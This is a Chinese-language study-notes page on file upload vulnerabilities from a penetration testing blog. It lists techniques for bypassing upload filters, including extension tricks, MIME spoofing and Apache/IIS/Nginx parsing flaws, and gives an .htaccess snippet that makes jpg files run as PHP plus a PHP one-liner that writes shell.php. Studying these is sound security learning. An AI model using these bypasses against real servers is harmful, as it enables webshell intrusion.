<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Penetration/Ⅱ.web漏洞/文件上传/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">**文件上传** | jsl_blog</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://j1NsiLei.github.io/docs/Penetration/Ⅱ.web漏洞/文件上传/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="keywords" content="技术博客,博客,学习笔记"><meta data-rh="true" property="og:type" content="website"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="**文件上传** | jsl_blog"><meta data-rh="true" name="description" content="漏洞成因"><meta data-rh="true" property="og:description" content="漏洞成因"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://j1NsiLei.github.io/docs/Penetration/Ⅱ.web漏洞/文件上传/"><link data-rh="true" rel="alternate" href="https://j1NsiLei.github.io/docs/Penetration/Ⅱ.web漏洞/文件上传/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://j1NsiLei.github.io/docs/Penetration/Ⅱ.web漏洞/文件上传/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="jsl_blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="jsl_blog Atom Feed"><link rel="stylesheet" href="/assets/css/styles.9cc5284a.css">
<script src="/assets/js/runtime~main.89bad3b9.js" defer="defer"></script>
<script src="/assets/js/main.0ab83f53.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const a=new URLSearchParams(window.location.search).entries();for(var[t,e]of a)if(t.startsWith("docusaurus-data-")){var n=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(n,e)}}catch(t){}}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/favicon.ico"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><div class="announcementBar_mb4j" style="background-color:#fafbfc;color:#091E42" role="banner"><div class="announcementBarPlaceholder_vyr4"></div><div class="content_knG7 announcementBarContent_xLdY">⭐️ 如果这个网站能帮助到你，欢迎给一个star支持作者  <a target="_blank" rel="noopener noreferrer" href="https://github.com/j1NsiLei/">GitHub</a></div><button type="button" aria-label="关闭" class="clean-btn close closeButton_CVFx announcementBarClose_gvF7"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/favicon.ico" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/favicon.ico" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">学习笔记</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/Penetration/">渗透测试</a><a class="navbar__item navbar__link" href="/docs/Response/">应急响应</a><a class="navbar__item navbar__link" href="/docs/Code/">代码审计</a><a class="navbar__item navbar__link" href="/docs/Assessment/">等保测评</a><a class="navbar__item navbar__link" href="/docs/System/">操作系统</a><a class="navbar__item navbar__link" href="/docs/Tools/">工具合集</a><a class="navbar__item navbar__link" href="/docs/Other/">其他</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/blog">Blog</a><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>简体中文</a><ul class="dropdown__menu"><li><a href="/docs/Penetration/Ⅱ.web漏洞/文件上传/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="zh-Hans">简体中文</a></li></ul></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="搜索" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/"><img src="/img/favicon.ico" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/favicon.ico" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"><b>学习笔记</b></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG menuWithAnnouncementBar_GW3s"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item green"><a class="menu__link" href="/docs/Penetration/">渗透测试</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/Penetration/Ⅰ.信息收集/">信息收集</a><button aria-label="展开侧边栏分类 &#x27;信息收集&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/Penetration/Ⅱ.web漏洞/">web漏洞</a><button aria-label="折叠侧边栏分类 &#x27;web漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/CSRF/">CSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/RCE 远程代码执行/">RCE 远程代码执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/SQL注入/">SQL注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/WAF绕过/">WAF绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/XSS/">XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/业务逻辑漏洞/">业务逻辑漏洞</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/反序列化/">反序列化</a><button aria-label="展开侧边栏分类 &#x27;反序列化&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/常见web框架漏洞/">常见web框架漏洞</a><button aria-label="展开侧边栏分类 &#x27;常见web框架漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/文件上传/">文件上传</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/文件包含/">文件包含</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/Penetration/Ⅱ.web漏洞/解析漏洞/">解析漏洞</a><button aria-label="展开侧边栏分类 &#x27;解析漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed green"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/Penetration/Ⅲ.内网渗透/">内网渗透</a><button aria-label="展开侧边栏分类 &#x27;内网渗透&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/Penetration/Ⅱ.web漏洞/"><span itemprop="name">web漏洞</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">文件上传</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1><strong>文件上传</strong></h1></header>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="漏洞成因">漏洞成因<a href="#漏洞成因" class="hash-link" aria-label="漏洞成因的直接链接" title="漏洞成因的直接链接">​</a></h3>
<p>攻击者通过网页中的一些没有做过滤或者过滤不足的文件上传点，通过一些特殊构造方式进行绕过，并将木马或者一些特殊文件通过上传点上传至服务器上，从而获取webshell，导致服务器权限被获取，服务器中内容被泄露；甚至可能导致攻击者利用得到的webshell提升至更高权限的shell，使得服务器被攻击者控制使用。</p>
<p>文件上传漏洞需满足的条件：上传的木马文件所使用的语言在服务器要有环境去运行；上传的文件要有可执行的权限；已知上传后的文件位置和文件名；识别语言类型php/asp/jsp/aspx。</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="绕过方式">绕过方式<a href="#绕过方式" class="hash-link" aria-label="绕过方式的直接链接" title="绕过方式的直接链接">​</a></h3>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="前端验证绕过">前端验证绕过<a href="#前端验证绕过" class="hash-link" aria-label="前端验证绕过的直接链接" title="前端验证绕过的直接链接">​</a></h5>
<p>直接禁用或者删除<code>js</code></p>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="后端mime类型检测绕过">后端MIME类型检测绕过<a href="#后端mime类型检测绕过" class="hash-link" aria-label="后端MIME类型检测绕过的直接链接" title="后端MIME类型检测绕过的直接链接">​</a></h5>
<p>bp抓包后修改请求头上的<code>Content-Type</code>值（例：<code>image/jpeg</code>）</p>
<h5 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="黑名单上传内容只要不在黑名单就行">黑名单（上传内容只要不在黑名单就行）<a href="#黑名单上传内容只要不在黑名单就行" class="hash-link" aria-label="黑名单（上传内容只要不在黑名单就行）的直接链接" title="黑名单（上传内容只要不在黑名单就行）的直接链接">​</a></h5>
<p>1.相似扩展名<code>.php4</code>、<code>.php5</code>、<code>.phtm</code>等</p>
<p>2.<code>apache</code>的配置文件<code>.htaccess</code>，通过上传<code>.htaccess</code>将<code>jpg</code>后缀文件解析为<code>php</code>代码</p>
<p>注：<code>.htaccess</code> 默认不支持 <code>nginx</code>，设置后支持,默认支持<code>Apache</code>，<code>.htaccess</code> 可以通过设置实现<code>nginx</code>文件解析配置，将<code>.png</code> 后缀的文件解析成 <code>php</code>。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#将jpg后缀的文件当做php来执行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AddType application/x-httpd-php .jpg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#将所有名字里含有shell的文件当做php来执行</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;FilesMatch &quot;shell&quot;&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SetHandler application/x-httpd-php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/FilesMatchc&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>3.后缀大小写绕过（<code>Php,PHP,pHp</code>等），在 <code>PHP</code> 环境下，服务器默认是不区分文件名大小写的（在 <code>Windows</code> 系统下更是如此）</p>
<p>4.空格绕过（<code>shell.php </code> ），在 <code>Windows</code> 系统中，保存文件时会自动去除文件名末尾的空格，而黑名单中通常不会包含带空格的后缀</p>
<p>5.加点绕过（<code>shell.php.</code>），在 <code>Windows</code> 系统下，文件名最后一个点会被自动忽略</p>
<p>6.<code>::$DATA</code>绕过，<code>shell.php::$DATA</code>，利用<code>windows</code>下的<code>NTFS</code>文件系统的一个特性；服务器检测时，可能会将<code>::$DATA</code>视为非法字符而不进行严格检查，但 <code>Windows</code> 系统会正确处理这个文件名，将其保存为<code>shell.php</code>，当我们访问<code>shell.php::$data</code>就相当于请求<code>shell.php</code>；</p>
<p>7.点空点（. .）绕过，<code>shell.php. .</code>，适用于黑名单仅过滤一次</p>
<p>8.双写绕过，<code>shell.phphpp</code>，适用于黑名单会检测删除<code>php</code>后缀</p>
<p>9.解析漏洞利用绕过</p>
<p><code>apache</code>解析漏洞</p>
<p>解析时，如果遇到不认识的后缀会从右往左继续判断，我们可以构造<code>shell.php.swp.xzh</code>，<code>apache</code>会一直往左解析直到解析到<code>php</code>，将文件识别为<code>php</code>文件进行执行，但是文件后缀为<code>xzh</code>从而绕过黑名单；</p>
<p><code>Apache HTTPD</code> 换行解析漏洞（<code>CVE-2017-15715</code>）<code>apache</code> 通过 <code>mod_php</code> 来运行脚本，其 <code>2.4.0-2.4.29</code> 中存在 <code>apache</code> 换行解析漏洞，在解析 <code>php</code> 时 <code>xxx.php\x0A</code> 将被按照 <code>PHP</code> 后缀进行解析，导致绕过一些服务器的安全策略</p>
<p><code>IIS</code>解析漏洞</p>
<p>目录解析漏洞(<code>/test.asp/1.jpg</code>)</p>
<p>在 <code>IIS5.x/6.0</code> 中，在网站下建立文件夹的名字为<code>*.asp、*.asa、*.cer、*.cdx</code> 的文件夹，那么其目录内的任何扩展名的文件都会被<code>IIS</code>当做<code>asp</code>文件来解释并执行。例如创建目录 <code>test.asp</code>，那么 <code>/test.asp/1.jpg</code> 将被当做<code>asp</code>文件来执行。</p>
<p>文件名解析漏洞(<code>test.asp;.jpg</code>)</p>
<p>在 <code>IIS5.x/6.0</code> 中， 分号后面的不被解析，也就是说 <code>test.asp;.jpg</code> 会被服务器看成是<code>test.asp</code>。还有<code>IIS6.0</code>默认的可执行文件除了<code>asp</code>还包含这两种 <code>.asa  .cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <code>.asp;.jpg、.asa;.jpg、.cer;.jpg</code> 后缀的文件，就可以通过服务器校验，并且服务器会把其当成<code>asp</code>文件执行。</p>
<p>畸形解析漏洞(<code>test.jpg/*.php</code>)</p>
<p>在 <code>IIS7.0</code>中，在默认<code>Fast-CGI</code>开启状况下，上传图片马后访问<code>test.jpg/*.php</code>会将其当作<code>php</code>文件进行执行，我们在图片马中写入如下一句话木马，就能在其目录下创建一个<code>shell.php</code>，从而拿到<code>shell</code>；但是只要设置 <code>cgi.fix_pathinfo</code>为0就不能使用这个漏洞</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;); ?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>Nginx</code>解析漏洞</p>
<p>畸形解析漏洞(<code>test.jpg/*.php</code>)</p>
<p>与上面<code>IIS</code>同理，<code>Nginx</code>也可以使用这个漏洞，上传图片马后访问<code>test.jpg/*.php</code>会将其当作<code>php</code>文件进行执行，我们在图片马中写入如下一句话木马，就能在其目录下创建一个<code>shell.php</code>，从而拿到<code>shell</code>；因为<code>cgi.fix_pathinfo</code>是php中的参数，默认是开启为1的状态；但在高版本的<code>php</code>中，由于<code>security.limit_extensions</code> 的引入，使得该漏洞难以被成功利用，低版本<code>php</code>中只要设置 <code>cgi.fix_pathinfo</code>为0就不能使用这个漏洞</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;); ?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>%00空字节代码解析漏洞</p>
<p><code>Ngnix</code>在遇到<code>%00</code>空字节时与后端<code>FastCGI</code>处理不一致，导致可以在图片中嵌入<code>PHP</code>代码然后通过访问<code>xxx.jpg%00.php</code>来执行其中的代码</p>
<p>在以下版本的nginx中，我们在图片中嵌入PHP代码然后通过访问 xxx.jpg%00.php 来执行其中的代码</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> Nginx 0.5.*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Nginx 0.6.*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Nginx 0.7 &lt;= 0.7.65</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Nginx 0.8 &lt;= 0.8.37</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>CVE-2013-4547(%20%00)</p>
<p>影响nginx版本：nginx 0.8.41 ~ 1.5.6</p>
<p>非法字符空格（%20）和截止符（%00）会导致<code>Nginx</code>解析<code>URL</code>时的有限状态机混乱，允许攻击者通过一个非编码空格绕过后缀名限制。</p>
